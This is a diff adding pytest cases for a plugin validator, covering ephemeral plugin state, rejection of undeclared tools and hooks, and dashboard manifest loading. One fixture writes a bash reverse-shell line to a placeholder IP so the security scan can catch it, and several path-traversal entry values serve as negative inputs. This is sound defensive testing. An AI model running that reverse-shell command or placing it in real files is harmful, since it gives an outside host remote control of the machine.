@@ -6,8 +6,10 @@ recording stub context.
 
 from __future__ import annotations
 
+import json
 from pathlib import Path
 
+import pytest
 import yaml
 
 from hermes_cli.plugin_validate import validate_plugin_dir
@@ -17,12 +19,13 @@ def _make_plugin(
     tmp_path: Path,
     *,
     manifest: dict,
-    init_py: str = "def register(ctx):\n    pass\n",
+    init_py: str | None = "def register(ctx):\n    pass\n",
 ) -> Path:
     d = tmp_path / manifest.get("name", "fixture-plugin")
     d.mkdir(parents=True, exist_ok=True)
     (d / "plugin.yaml").write_text(yaml.safe_dump(manifest), encoding="utf-8")
-    (d / "__init__.py").write_text(init_py, encoding="utf-8")
+    if init_py is not None:
+        (d / "__init__.py").write_text(init_py, encoding="utf-8")
     return d
 
 
@@ -156,6 +159,105 @@ class TestCapabilityProbe:
         )
         report = validate_plugin_dir(d)
         assert report.ok, report.failures
+
+    def test_probe_state_is_ephemeral_json_storage(self, tmp_path):
+        """Registration can retain ctx.state and read/write JSON without durable storage."""
+        d = _make_plugin(
+            tmp_path,
+            manifest={**BASE_MANIFEST, "provides_hooks": ["on_session_start"]},
+            init_py=(
+                "import os\n"
+                "from pathlib import Path\n"
+                "def register(ctx):\n"
+                "    state = ctx.state\n"
+                "    assert state is ctx.state\n"
+                "    assert state.get('wake') is None\n"
+                "    default = {'hash': '', 'delivered_at': 0}\n"
+                "    assert state.get('wake', default=default) is default\n"
+                "    value = {'hash': 'probe', 'delivered_at': 1, 'items': [1]}\n"
+                "    assert state.set('wake', value) is None\n"
+                "    value['items'].append(2)\n"
+                "    loaded = state.get('wake')\n"
+                "    assert loaded == {'hash': 'probe', 'delivered_at': 1, 'items': [1]}\n"
+                "    loaded['items'].append(3)\n"
+                "    assert state.get('wake')['items'] == [1]\n"
+                "    assert not (Path(os.environ['HERMES_HOME']) / 'plugin-data').exists()\n"
+                "    ctx.register_hook('on_session_start', lambda **kw: None)\n"
+            ),
+        )
+        for _ in range(2):
+            report = validate_plugin_dir(d)
+            assert report.ok, report.failures
+
+    @pytest.mark.parametrize(("operation", "failure"), [
+        ("ctx.unknown_api()", "unknown_api"),
+        ("ctx.state.clear()", "clear"),
+        ("ctx.register_tool('sneaky_tool', 'sneaky', {}, lambda a: '')", "undeclared tools"),
+        ("ctx.register_hook('pre_tool_call', lambda **kw: None)", "undeclared hooks"),
+        ("ctx.register_middleware('pre_llm_call', lambda **kw: None)", "undeclared middleware"),
+    ])
+    def test_probe_state_preserves_admission_failures(self, tmp_path, operation, failure):
+        d = _make_plugin(
+            tmp_path,
+            manifest=dict(BASE_MANIFEST),
+            init_py=(
+                "def register(ctx):\n"
+                "    ctx.state.set('wake', {'hash': 'probe'})\n"
+                f"    {operation}\n"
+            ),
+        )
+        report = validate_plugin_dir(d)
+        assert not report.ok
+        assert any(failure in detail for detail in report.failures), report.failures
+
+
+class TestDashboardLoadability:
+    @pytest.mark.parametrize(("manifest", "entry"), [
+        ({"entry": "plugin.js"}, "plugin.js"),
+        ({}, "dist/index.js"),
+    ])
+    @pytest.mark.parametrize("dangerous", [False, True])
+    def test_dashboard_entry_is_loadable_and_scanned(self, tmp_path, manifest, entry, dangerous):
+        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=None)
+        dashboard = d / "dashboard"
+        target = dashboard / entry
+        target.parent.mkdir(parents=True)
+        target.write_text("// synthetic dashboard bundle\n", encoding="utf-8")
+        (dashboard / "manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
+        if dangerous:
+            (dashboard / "setup.sh").write_text(
+                "/bin/bash -i >/dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8",
+            )
+
+        report = validate_plugin_dir(d)
+
+        assert ("loadable", True, f"entry: dashboard/{entry}") in report.checks
+        assert report.ok is not dangerous, report.failures
+        assert any(name == "security scan" and ok is not dangerous for name, ok, _ in report.checks)
+
+    @pytest.mark.parametrize("manifest", [
+        None, "{", "[]", "null", '{"entry": null}', '{"entry": 3}',
+        '{"entry": ""}', '{}', '{"entry": "missing.js"}',
+        '{"entry": "dist"}', '{"entry": "../outside.js"}',
+        '{"entry": "dist/../plugin.js"}', '{"entry": "/outside.js"}',
+        '{"entry": "C:/outside.js"}', '{"entry": "C:outside.js"}',
+        json.dumps({"entry": "..\\outside.js"}),
+        json.dumps({"entry": "\\\\server\\share\\outside.js"}),
+    ])
+    def test_dashboard_requires_valid_manifest_and_contained_file(self, tmp_path, manifest):
+        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=None)
+        dashboard = d / "dashboard"
+        (dashboard / "dist").mkdir(parents=True)
+        (dashboard / "plugin.js").write_text("// fixture\n", encoding="utf-8")
+        (d / "outside.js").write_text("// fixture\n", encoding="utf-8")
+        if manifest is not None:
+            (dashboard / "manifest.json").write_text(manifest, encoding="utf-8")
+
+        report = validate_plugin_dir(d)
+
+        assert not report.ok
+        assert any(name == "loadable" and not ok for name, ok, _ in report.checks)
+        assert any(name == "security scan" for name, _, _ in report.checks)
 
 
 class TestModelProviderKind:
